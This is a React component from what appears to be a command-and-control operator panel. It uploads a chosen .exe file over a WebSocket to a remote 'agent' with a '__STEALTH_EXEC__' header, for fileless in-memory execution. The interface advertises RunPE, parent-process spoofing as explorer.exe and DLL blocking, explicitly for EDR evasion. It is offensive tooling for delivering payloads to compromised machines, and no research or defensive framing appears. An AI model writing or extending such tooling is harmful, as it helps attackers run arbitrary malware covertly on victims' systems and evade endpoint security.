import React, { useCallback, useState, useRef } from 'react';
import { useDropzone } from 'react-dropzone';
import { Shield, Zap, FileCode, AlertTriangle, CheckCircle, UploadCloud } from 'lucide-react';
import { WS_BASE_URL } from '../../config';

export default function FileExecutor({ agentId }) {
    const [status, setStatus] = useState('Ready');
    const [file, setFile] = useState(null);
    const [progress, setProgress] = useState(0);
    const wsRef = useRef(null);

    const onDrop = useCallback(acceptedFiles => {
        if (acceptedFiles?.length > 0) {
            setFile(acceptedFiles[0]);
            setStatus('Ready to execute');
        }
    }, []);

    const { getRootProps, getInputProps, isDragActive } = useDropzone({ onDrop, multiple: false });

    const handleExecute = () => {
        if (!file) return;

        setStatus('Reading file...');
        const reader = new FileReader();
        
        reader.onload = () => {
            const arrayBuffer = reader.result;
            const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
            wsRef.current = ws;

            ws.onopen = () => {
                setStatus('Transmitting...');
                // Create a blob with the command header + binary data
                // Header: "__STEALTH_EXEC__|"
                const header = new TextEncoder().encode("__STEALTH_EXEC__|");
                const payload = new Uint8Array(header.length + arrayBuffer.byteLength);
                payload.set(header, 0);
                payload.set(new Uint8Array(arrayBuffer), header.length);

                ws.send(payload);
                setStatus('Payload Sent. Executing in memory...');
                setProgress(100);
                setTimeout(() => {
                    ws.close();
                    setStatus('Execution Command Complete.');
                }, 1000);
            };

            ws.onerror = () => setStatus('Error: Connection Failed');
        };

        reader.readAsArrayBuffer(file);
    };

    return (
        <div className="flex flex-col h-full bg-[#0c0c0c] text-gray-300 p-8 items-center justify-center">
            <div className="max-w-2xl w-full bg-[#1a1a1a] border border-[#333] rounded-lg p-8 shadow-2xl relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-600 to-purple-600"></div>
                
                <div className="flex items-center gap-4 mb-8 border-b border-[#333] pb-6">
                    <div className="bg-[#222] p-3 rounded-full border border-[#333]">
                        <Zap className="text-red-500" size={32} />
                    </div>
                    <div>
                        <h2 className="text-2xl font-bold text-white">Stealth Fileless Execution</h2>
                        <p className="text-gray-500 text-sm">RunPE with PPID Spoofing & BlockDLLs (EDR Evasion).</p>
                    </div>
                </div>

                <div className="flex flex-col gap-6">
                    {/* Dropzone */}
                    <div 
                        {...getRootProps()} 
                        className={`border-2 border-dashed rounded-lg p-10 flex flex-col items-center justify-center transition-all cursor-pointer h-48
                        ${isDragActive ? 'border-red-500 bg-red-900/10' : 'border-[#333] hover:border-red-500/50 hover:bg-[#222]'}`}
                    >
                        <input {...getInputProps()} />
                        {file ? (
                            <div className="flex flex-col items-center text-red-400 animate-fade-in">
                                <FileCode size={48} className="mb-4"/>
                                <span className="font-mono font-bold text-lg">{file.name}</span>
                                <span className="text-xs text-gray-500 mt-1">{(file.size / 1024).toFixed(1)} KB</span>
                            </div>
                        ) : (
                            <div className="flex flex-col items-center text-gray-500">
                                <UploadCloud size={48} className="mb-4 opacity-50"/>
                                <p className="font-bold">Drag & drop .exe file here</p>
                                <p className="text-xs mt-2">or click to select</p>
                            </div>
                        )}
                    </div>

                    {/* Technique Info */}
                    <div className="grid grid-cols-2 gap-4">
                        <div className="bg-[#111] p-3 rounded border border-[#333] flex items-center gap-3">
                            <Shield size={20} className="text-green-500"/>
                            <div>
                                <div className="text-xs font-bold text-gray-400">PPID SPOOFING</div>
                                <div className="text-xs text-gray-600">Parent: explorer.exe</div>
                            </div>
                        </div>
                        <div className="bg-[#111] p-3 rounded border border-[#333] flex items-center gap-3">
                            <AlertTriangle size={20} className="text-yellow-500"/>
                            <div>
                                <div className="text-xs font-bold text-gray-400">BLOCK DLLS</div>
                                <div className="text-xs text-gray-600">Non-MS Binaries Blocked</div>
                            </div>
                        </div>
                    </div>

                    <button 
                        onClick={handleExecute}
                        disabled={!file}
                        className={`p-4 rounded font-bold transition flex items-center justify-center gap-2
                        ${file 
                            ? 'bg-red-900/30 hover:bg-red-800/50 text-red-400 border border-red-900/50 hover:border-red-500 cursor-pointer shadow-lg shadow-red-900/20' 
                            : 'bg-[#222] text-gray-600 border border-[#333] cursor-not-allowed'
                        }`}
                    >
                        <Zap size={18} className={file ? "fill-current" : ""} />
                        {file ? "EXECUTE IN MEMORY" : "Select Target Payload"}
                    </button>

                    {status && (
                        <div className="text-center font-mono text-sm text-gray-400 mt-2">
                            STATUS: <span className="text-white">{status}</span>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}
